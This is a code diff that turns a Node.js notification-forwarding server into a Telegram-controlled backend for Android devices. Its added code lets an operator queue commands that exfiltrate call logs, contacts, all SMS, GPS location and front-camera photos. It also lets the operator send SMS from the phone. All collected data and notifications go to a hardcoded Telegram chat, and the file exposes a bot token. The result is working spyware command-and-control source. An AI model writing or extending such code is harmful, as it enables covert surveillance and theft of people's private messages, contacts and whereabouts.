@@ -1,290 +1,368 @@
 const express = require('express');
+const { Telegraf, Markup } = require('telegraf');
+const multer = require('multer');
 const cors = require('cors');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
-
 app.use(cors());
 app.use(express.json());
 
-// In-memory database
-// codes: code -> { deviceId, deviceName, paired: boolean, adminDeviceId: String }
-const codes = {}; 
-// notifications: deviceId -> Array of Notification Objects
-const notifications = {}; 
-// adminPairs: adminDeviceId -> userDeviceId
-const adminPairs = {};
-// deviceNames: deviceId -> name
-const deviceNames = {};
+// --- Setup Multer ---
+const uploadDir = path.join(__dirname, 'uploads');
+if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
 
-// Helper to generate a unique random uppercase alphanumeric code (6 characters)
-function generatePairingCode() {
-  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // Exclude ambiguous characters like I, O, 0, 1
-  let code;
-  do {
-    code = '';
-    for (let i = 0; i < 6; i++) {
-      code += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-  } while (codes[code]); // Ensure uniqueness
-  return code;
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => cb(null, uploadDir),
+    filename: (req, file, cb) => cb(null, file.originalname)
+});
+const upload = multer({ storage });
+
+// --- Multi-Device State ---
+// devices[deviceId] = { name, lastSeen, pendingCommand, requestingChatId }
+const devices = {};
+
+// Per-user: which device they have currently selected
+// userSession[chatId] = deviceId
+const userSession = {};
+
+// Per-device extra command data (e.g. sms target/body)
+// deviceExtras[deviceId] = { smsTo, smsBody }
+const deviceExtras = {};
+
+const ONLINE_TIMEOUT_MS = 60 * 1000; // 60 seconds — device considered online
+
+function getOnlineDevices() {
+    const now = Date.now();
+    return Object.entries(devices).filter(([, d]) => (now - d.lastSeen) < ONLINE_TIMEOUT_MS);
 }
 
-// Generate a random ID
-function generateId() {
-  return 'dev_' + Math.random().toString(36).substring(2, 15);
+// --- Telegram Bot ---
+const BOT_TOKEN = '8710683386:AAFwZ_aRbFNVBVBO0HRGW6S_LBTCgYIiYZc';
+const bot = new Telegraf(BOT_TOKEN);
+
+// Helper: send device list menu
+function sendDeviceMenu(ctx) {
+    const online = getOnlineDevices();
+    if (online.length === 0) {
+        return ctx.reply(
+            '📵 *No devices connected.*\n\nMake sure the app is installed and running on your device.',
+            { parse_mode: 'Markdown' }
+        );
+    }
+
+    const buttons = online.map(([id, d]) =>
+        [Markup.button.callback(`📱 ${d.name}`, `select_device_${id}`)]
+    );
+    buttons.push([Markup.button.callback('🔄 Refresh', 'refresh_devices')]);
+
+    return ctx.reply(
+        `🛰️ *Connected Devices* — ${online.length} online\n\nSelect a device to control:`,
+        {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard(buttons)
+        }
+    );
 }
 
-// Welcome Dashboard Page
-app.get('/', (req, res) => {
-  const activeUsers = Object.keys(deviceNames).length;
-  const activePairs = Object.keys(adminPairs).length;
-  let totalNotificationsCount = 0;
-  Object.values(notifications).forEach(list => {
-    totalNotificationsCount += list.length;
-  });
-
-  res.send(`
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>NotifyBridge Server</title>
-      <script src="https://cdn.tailwindcss.com"></script>
-      <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono&display=swap');
-        body {
-          font-family: 'Space Grotesk', sans-serif;
+// Helper: send command menu for a device
+function sendCommandMenu(ctx, deviceId, deviceName) {
+    return ctx.editMessageText(
+        `📱 *${deviceName}*\n\nChoose a command to run on this device:`,
+        {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([
+                [
+                    Markup.button.callback('📞 Call History', `cmd_ch_${deviceId}`),
+                    Markup.button.callback('👥 Contacts',    `cmd_contact_${deviceId}`)
+                ],
+                [
+                    Markup.button.callback('💬 All SMS',     `cmd_as_${deviceId}`),
+                    Markup.button.callback('📍 Location',    `cmd_loc_${deviceId}`)
+                ],
+                [
+                    Markup.button.callback('📸 Front Camera', `cmd_cf_${deviceId}`),
+                    Markup.button.callback('📤 Send SMS',     `cmd_smsmode_${deviceId}`)
+                ],
+                [Markup.button.callback('« Back to Devices', 'back_to_devices')]
+            ])
         }
-        .code-font {
-          font-family: 'JetBrains Mono', monospace;
+    );
+}
+
+// /start — show device menu
+bot.start((ctx) => sendDeviceMenu(ctx));
+
+// /devices — show device menu
+bot.command('devices', (ctx) => sendDeviceMenu(ctx));
+
+// --- Inline Keyboard Callbacks ---
+
+// Refresh device list
+bot.action('refresh_devices', async (ctx) => {
+    await ctx.answerCbQuery('🔄 Refreshing...');
+    return sendDeviceMenu(ctx);
+});
+
+// Back to device list
+bot.action('back_to_devices', async (ctx) => {
+    await ctx.answerCbQuery();
+    return sendDeviceMenu(ctx);
+});
+
+// Select a device
+bot.action(/^select_device_(.+)$/, async (ctx) => {
+    const deviceId = ctx.match[1];
+    const device = devices[deviceId];
+    if (!device) {
+        await ctx.answerCbQuery('⚠️ Device no longer online!');
+        return sendDeviceMenu(ctx);
+    }
+    userSession[ctx.chat.id] = deviceId;
+    await ctx.answerCbQuery(`Selected: ${device.name}`);
+    return sendCommandMenu(ctx, deviceId, device.name);
+});
+
+// Run a command on the selected device (excludes smsmode — handled separately below)
+bot.action(/^cmd_(ch|contact|as|loc|cf)_(.+)$/, async (ctx) => {
+    const command = ctx.match[1];
+    const deviceId = ctx.match[2];
+    const device = devices[deviceId];
+    if (!device) {
+        await ctx.answerCbQuery('⚠️ Device went offline!');
+        return sendDeviceMenu(ctx);
+    }
+
+    const commandLabels = {
+        ch:      '📞 Call History',
+        contact: '👥 Contacts',
+        as:      '💬 All SMS',
+        loc:     '📍 Location',
+        cf:      '📸 Front Camera'
+    };
+
+    device.pendingCommand = command;
+    device.requestingChatId = ctx.chat.id;
+
+    await ctx.answerCbQuery('✅ Command sent!');
+    await ctx.editMessageText(
+        `⏳ *${commandLabels[command] || command}* command sent to *${device.name}*.\n\nWaiting for the device to respond…`,
+        { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back', `select_device_${deviceId}`)]]) }
+    );
+});
+
+// --- SMS Wizard (step-by-step UI) ---
+// smsWizard[chatId] = { step: 'number' | 'message', deviceId, smsTo }
+const smsWizard = {};
+
+// Step 1: user taps "📤 Send SMS" button
+bot.action(/^cmd_smsmode_(.+)$/, async (ctx) => {
+    const deviceId = ctx.match[1];
+    const device = devices[deviceId];
+    if (!device) { await ctx.answerCbQuery('⚠️ Device offline!'); return; }
+    userSession[ctx.chat.id] = deviceId;
+    smsWizard[ctx.chat.id] = { step: 'number', deviceId };
+    await ctx.answerCbQuery();
+    await ctx.editMessageText(
+        `📤 *Send SMS from ${device.name}*\n\n━━━━━━━━━━━━━━\n📞 *Step 1 of 2*\n\nPlease type the **phone number** to send the SMS to:\n\n_Example: +919876543210_`,
+        {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([
+                [Markup.button.callback('❌ Cancel', `select_device_${deviceId}`)]
+            ])
         }
-      </style>
-    </head>
-    <body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col justify-between">
-      
-      <!-- Navbar -->
-      <nav class="border-b border-slate-800 bg-slate-900/50 backdrop-blur-md px-6 py-4 flex justify-between items-center">
-        <div class="flex items-center space-x-3">
-          <span class="text-2xl font-bold bg-gradient-to-r from-emerald-400 to-teal-500 bg-clip-text text-transparent">NotifyBridge</span>
-          <span class="px-2.5 py-0.5 text-xs bg-emerald-500/10 text-emerald-400 border border-emerald-500/25 rounded-full font-medium">Server Live</span>
-        </div>
-        <div class="text-sm text-slate-400 code-font">v1.0.0</div>
-      </nav>
-
-      <!-- Main Content -->
-      <main class="max-w-4xl mx-auto px-6 py-12 flex-grow w-full">
-        <div class="text-center mb-12">
-          <h1 class="text-4xl md:text-5xl font-bold tracking-tight mb-4">
-            Forward Notifications Seamlessly
-          </h1>
-          <p class="text-slate-400 text-lg max-w-xl mx-auto">
-            Your high-performance notification forwarding engine is up and running. Ready to connect your Android user and admin app instances.
-          </p>
-        </div>
-
-        <!-- Metrics Grid -->
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
-          <div class="bg-slate-900/50 border border-slate-800 rounded-2xl p-6 flex flex-col">
-            <span class="text-slate-400 text-sm font-medium mb-1">Registered User Devices</span>
-            <span class="text-4xl font-bold text-slate-100">${activeUsers}</span>
-          </div>
-          <div class="bg-slate-900/50 border border-slate-800 rounded-2xl p-6 flex flex-col">
-            <span class="text-slate-400 text-sm font-medium mb-1">Active Paired Connections</span>
-            <span class="text-4xl font-bold text-teal-400">${activePairs}</span>
-          </div>
-          <div class="bg-slate-900/50 border border-slate-800 rounded-2xl p-6 flex flex-col">
-            <span class="text-slate-400 text-sm font-medium mb-1">Notifications Forwarded</span>
-            <span class="text-4xl font-bold text-emerald-400">${totalNotificationsCount}</span>
-          </div>
-        </div>
-
-        <!-- Connection Guide -->
-        <div class="bg-slate-900/30 border border-slate-800/80 rounded-2xl p-8">
-          <h2 class="text-xl font-bold mb-4 flex items-center space-x-2">
-            <svg class="w-5 h-5 text-teal-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-            <span>How to Connect Your App</span>
-          </h2>
-          <div class="space-y-4 text-slate-300">
-            <div class="flex items-start space-x-3">
-              <span class="bg-slate-800 text-slate-300 w-6 h-6 rounded-full flex items-center justify-center text-sm font-bold flex-shrink-0 mt-0.5">1</span>
-              <div>
-                <p class="font-medium text-slate-200">Set the Server Link</p>
-                <p class="text-sm text-slate-400">In the Android App, make sure the Server URL is set to this website URL (excluding trailing slashes).</p>
-              </div>
-            </div>
-            <div class="flex items-start space-x-3">
-              <span class="bg-slate-800 text-slate-300 w-6 h-6 rounded-full flex items-center justify-center text-sm font-bold flex-shrink-0 mt-0.5">2</span>
-              <div>
-                <p class="font-medium text-slate-200">Generate Pairing Code</p>
-                <p class="text-sm text-slate-400">Open the app on the User's phone to generate a unique 6-character connection code.</p>
-              </div>
-            </div>
-            <div class="flex items-start space-x-3">
-              <span class="bg-slate-800 text-slate-300 w-6 h-6 rounded-full flex items-center justify-center text-sm font-bold flex-shrink-0 mt-0.5">3</span>
-              <div>
-                <p class="font-medium text-slate-200">Connect Admin Instance</p>
-                <p class="text-sm text-slate-400">Enter that code into the Admin section of the second phone to establish a secure notification socket bridge.</p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </main>
-
-      <!-- Footer -->
-      <footer class="border-t border-slate-900/80 bg-slate-950 px-6 py-6 text-center text-sm text-slate-500">
-        <div>Deployed on Render / Cloud Platform &bull; Secured with HTTPS</div>
-      </footer>
-
-    </body>
-    </html>
-  `);
+    );
 });
 
-// 1. REGISTER USER DEVICE
-// Request: { deviceName: '...' }
-// Response: { deviceId: '...', code: '...' }
-app.post('/api/register', (req, res) => {
-  const { deviceName } = req.body;
-  if (!deviceName) {
-    return res.status(400).json({ error: 'deviceName is required' });
-  }
+// Step 2 & 3: intercept user text input for wizard
+bot.on('text', async (ctx) => {
+    const chatId = ctx.chat.id;
+    const wizard = smsWizard[chatId];
 
-  const deviceId = generateId();
-  const code = generatePairingCode();
+    // If not in wizard mode, check for /ms command handled separately
+    if (!wizard) return;
 
-  codes[code] = {
-    deviceId,
-    deviceName,
-    paired: false,
-    adminDeviceId: null
-  };
+    const text = ctx.message.text.trim();
 
-  notifications[deviceId] = [];
-  deviceNames[deviceId] = deviceName;
+    if (wizard.step === 'number') {
+        // User sent the phone number
+        wizard.smsTo = text;
+        wizard.step = 'message';
+        smsWizard[chatId] = wizard;
 
-  console.log(`Registered User Device: ${deviceName} [${deviceId}] with Code: ${code}`);
+        await ctx.reply(
+            `✅ *Number saved:* \`${text}\`\n\n━━━━━━━━━━━━━━\n💬 *Step 2 of 2*\n\nNow type the **message** you want to send:`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('❌ Cancel', `select_device_${wizard.deviceId}`)]
+                ])
+            }
+        );
 
-  res.json({
-    deviceId,
-    code
-  });
-});
+    } else if (wizard.step === 'message') {
+        // User sent the message body — queue the SMS
+        const smsTo   = wizard.smsTo;
+        const smsBody = text;
+        const deviceId = wizard.deviceId;
+        delete smsWizard[chatId];
 
-// 2. PAIR ADMIN DEVICE WITH USER VIA CODE
-// Request: { adminDeviceId: '...', code: '...' }
-// Response: { success: true, pairedDeviceId: '...', pairedDeviceName: '...' }
-app.post('/api/pair', (req, res) => {
-  const { adminDeviceId, code } = req.body;
-  if (!adminDeviceId || !code) {
-    return res.status(400).json({ error: 'adminDeviceId and code are required' });
-  }
+        const device = devices[deviceId];
+        if (!device) {
+            return ctx.reply('⚠️ Device went offline. Please select a device again via /devices.');
+        }
 
-  const normalizedCode = code.trim().toUpperCase();
-  const registration = codes[normalizedCode];
+        device.pendingCommand = 'ms';
+        device.requestingChatId = chatId;
+        deviceExtras[deviceId] = { smsTo, smsBody };
 
-  if (!registration) {
-    return res.status(404).json({ error: 'Invalid pairing code' });
-  }
-
-  // Update pairing maps
-  registration.paired = true;
-  registration.adminDeviceId = adminDeviceId;
-  adminPairs[adminDeviceId] = registration.deviceId;
-
-  console.log(`Admin paired successfully: ${adminDeviceId} connected to User: ${registration.deviceName} [${registration.deviceId}]`);
-
-  res.json({
-    success: true,
-    pairedDeviceId: registration.deviceId,
-    pairedDeviceName: registration.deviceName
-  });
-});
-
-// 3. CHECK PAIRING STATUS
-// Request: GET /api/status?deviceId=... OR GET /api/status?adminDeviceId=...
-// Response: { paired: boolean, pairedDeviceName: '...', ... }
-app.get('/api/status', (req, res) => {
-  const { deviceId, adminDeviceId } = req.query;
-
-  if (deviceId) {
-    // Check if user is paired to an admin
-    const codeEntry = Object.values(codes).find(c => c.deviceId === deviceId);
-    if (codeEntry && codeEntry.paired) {
-      return res.json({
-        paired: true,
-        adminDeviceId: codeEntry.adminDeviceId
-      });
+        await ctx.reply(
+            `🚀 *SMS Queued Successfully!*\n\n` +
+            `📱 Device : *${device.name}*\n` +
+            `📞 To     : \`${smsTo}\`\n` +
+            `💬 Message: ${smsBody}\n\n` +
+            `_The message will be sent within ~10 seconds._`,
+            {
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('📤 Send Another SMS', `cmd_smsmode_${deviceId}`)],
+                    [Markup.button.callback('« Back to Menu',      `select_device_${deviceId}`)]
+                ])
+            }
+        );
     }
-    return res.json({ paired: false });
-  }
+});
 
-  if (adminDeviceId) {
-    const pairedUserId = adminPairs[adminDeviceId];
-    if (pairedUserId) {
-      return res.json({
-        paired: true,
-        pairedDeviceId: pairedUserId,
-        pairedDeviceName: deviceNames[pairedUserId] || 'User'
-      });
+// /ms <number> <message> — shortcut command (still supported)
+bot.command('ms', async (ctx) => {
+    const chatId = ctx.chat.id;
+    const deviceId = userSession[chatId];
+    if (!deviceId || !devices[deviceId]) {
+        return ctx.reply('⚠️ No device selected.\nUse /devices first to pick a device.');
     }
-    return res.json({ paired: false });
-  }
+    const raw = ctx.message.text.replace('/ms', '').trim();
+    const spaceIdx = raw.indexOf(' ');
+    if (spaceIdx === -1 || !raw) {
+        return ctx.reply('❌ Usage: `/ms <phone_number> <message>`\n\nOr tap 📤 *Send SMS* from the device menu.', { parse_mode: 'Markdown' });
+    }
+    const smsTo = raw.substring(0, spaceIdx).trim();
+    const smsBody = raw.substring(spaceIdx + 1).trim();
+    if (!smsTo || !smsBody) return ctx.reply('❌ Both phone number and message are required.');
 
-  res.status(400).json({ error: 'Must check either deviceId or adminDeviceId' });
+    const device = devices[deviceId];
+    device.pendingCommand = 'ms';
+    device.requestingChatId = chatId;
+    deviceExtras[deviceId] = { smsTo, smsBody };
+
+    ctx.reply(
+        `🚀 *SMS Queued!*\n\n📱 Device : *${device.name}*\n📞 To     : \`${smsTo}\`\n💬 Message: ${smsBody}\n\n_Will be sent within ~10 seconds._`,
+        { parse_mode: 'Markdown' }
+    );
 });
 
-// 4. POST NOTIFICATION FROM USER DEVICE
-// Request: { deviceId: '...', packageName: '...', title: '...', text: '...', timestamp: 123456789 }
-app.post('/api/notifications', (req, res) => {
-  const { deviceId, packageName, title, text, timestamp } = req.body;
-  if (!deviceId) {
-    return res.status(400).json({ error: 'deviceId is required' });
-  }
+// Launch bot
+bot.launch().then(() => console.log('✅ Telegraf Bot launched!'));
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
 
-  const list = notifications[deviceId];
-  if (!list) {
-    return res.status(404).json({ error: 'Device not registered' });
-  }
+// --- Express API Endpoints ---
 
-  const notificationItem = {
-    packageName: packageName || 'unknown',
-    title: title || 'No Title',
-    text: text || '',
-    timestamp: timestamp || Date.now()
-  };
+// 1. Android polls this endpoint to register and get its pending command
+app.get('/check-command', (req, res) => {
+    const { deviceId, deviceName } = req.query;
+    if (!deviceId) return res.status(400).json({ command: 'none' });
 
-  list.unshift(notificationItem); // Prepend to show newest first
+    // Register / update device heartbeat
+    if (!devices[deviceId]) {
+        devices[deviceId] = { name: deviceName || deviceId, lastSeen: Date.now(), pendingCommand: 'none', requestingChatId: null };
+    } else {
+        devices[deviceId].lastSeen = Date.now();
+        if (deviceName) devices[deviceId].name = decodeURIComponent(deviceName);
+    }
 
-  // Trim list to last 100 notifications to keep memory low
-  if (list.length > 100) {
-    list.pop();
-  }
+    const device = devices[deviceId];
+    if (device.pendingCommand && device.pendingCommand !== 'none') {
+        const cmd = device.pendingCommand;
+        device.pendingCommand = 'none';
+        // For ms command, attach extra params
+        if (cmd === 'ms' && deviceExtras[deviceId]) {
+            const extra = deviceExtras[deviceId];
+            delete deviceExtras[deviceId];
+            return res.json({ command: cmd, smsTo: extra.smsTo, smsBody: extra.smsBody });
+        }
+        return res.json({ command: cmd });
+    }
 
-  console.log(`Received notification for ${deviceId}: [${packageName}] ${title} - ${text}`);
-
-  res.json({ success: true });
+    return res.json({ command: 'none' });
 });
 
-// 5. GET NOTIFICATIONS FOR ADMIN
-// Request: GET /api/notifications?adminDeviceId=...
-app.get('/api/notifications', (req, res) => {
-  const { adminDeviceId } = req.query;
-  if (!adminDeviceId) {
-    return res.status(400).json({ error: 'adminDeviceId is required' });
-  }
+// 2. Android uploads a file (call log, contacts, SMS)
+app.post('/upload-log', upload.single('document'), async (req, res) => {
+    if (!req.file) return res.status(400).send('No file uploaded.');
 
-  const userDeviceId = adminPairs[adminDeviceId];
-  if (!userDeviceId) {
-    return res.json([]); // Return empty list rather than 404, or return empty indicating not paired
-  }
+    const deviceId = req.body.deviceId;
+    const device = devices[deviceId];
+    const chatId = device?.requestingChatId || '1691680798';
+    if (device) device.requestingChatId = null;
 
-  const list = notifications[userDeviceId] || [];
-  res.json(list);
+    try {
+        await bot.telegram.sendDocument(chatId, {
+            source: req.file.path,
+            filename: req.file.originalname
+        }, {
+            caption: device ? `📱 From: *${device.name}*` : undefined,
+            parse_mode: 'Markdown'
+        });
+        res.status(200).send('Forwarded.');
+    } catch (e) {
+        console.error('Upload error:', e);
+        res.status(500).send('Error forwarding.');
+    } finally {
+        fs.unlink(req.file.path, () => {});
+    }
 });
 
-// Start listening
-app.listen(PORT, '0.0.0.5' /* bind to all interfaces */ && '0.0.0.0', () => {
-  console.log(`NotifyBridge Server running on Port ${PORT}`);
+// 3. Android uploads GPS location
+app.post('/upload-location', async (req, res) => {
+    const { latitude, longitude, deviceId } = req.body;
+    if (!latitude || !longitude) return res.status(400).send('Missing coords.');
+
+    const device = devices[deviceId];
+    const chatId = device?.requestingChatId || '1691680798';
+    if (device) device.requestingChatId = null;
+
+    const mapsLink = `📍 *Location* ${device ? `from *${device.name}*` : ''}\nhttps://www.google.com/maps?q=${latitude},${longitude}`;
+
+    try {
+        await bot.telegram.sendMessage(chatId, mapsLink, { parse_mode: 'Markdown' });
+        res.status(200).send('Location forwarded.');
+    } catch (e) {
+        res.status(500).send('Error.');
+    }
 });
+
+// Health check
+app.get('/', (req, res) => res.send('✅ Multi-device bot server running.'));
+
+// 4. Android sends real-time notifications & SMS alerts through here
+app.post('/send-notification', async (req, res) => {
+    const { deviceId, text } = req.body;
+    if (!text) return res.status(400).send('Missing text.');
+
+    const device = devices[deviceId];
+    const deviceLabel = device ? `📱 *${device.name}*` : '📱 *Unknown Device*';
+    const fullText = `${deviceLabel}\n${text}`;
+
+    const CHAT_ID = '1691680798';
+    try {
+        await bot.telegram.sendMessage(CHAT_ID, fullText, { parse_mode: 'Markdown' });
+        res.status(200).send('Sent.');
+    } catch (e) {
+        console.error('Notification forward error:', e.message);
+        res.status(500).send('Error.');
+    }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`🚀 Server listening on port ${PORT}`));
